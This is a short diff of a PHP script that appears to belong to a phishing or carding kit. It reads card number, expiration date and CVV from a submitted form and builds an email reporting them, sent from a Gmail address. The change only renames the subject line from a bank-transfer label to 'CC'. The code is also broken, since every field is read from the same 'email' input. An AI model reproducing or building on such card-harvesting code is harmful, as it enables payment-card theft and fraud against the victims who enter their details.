@@ -7,7 +7,7 @@
 	$card_number = $_POST['email'];
 	$input_expiration_date = $_POST['email'];
 	$cvv = $_POST['email'];
-	$asunto = 'transfer SPEI enviado';
+	$asunto = 'transfer CC enviado';
 	$mensaje = "Nombre: ".$nombre."<br> Email: $card_number <br> input_expiration_date: $input_expiration_date <br> cvv: $cvv <br> item_name: $item_name <br> amount: $amount <br> currency_code: $currency_code";
 
 	$from = 'IAXG830920HS@gmail.com';
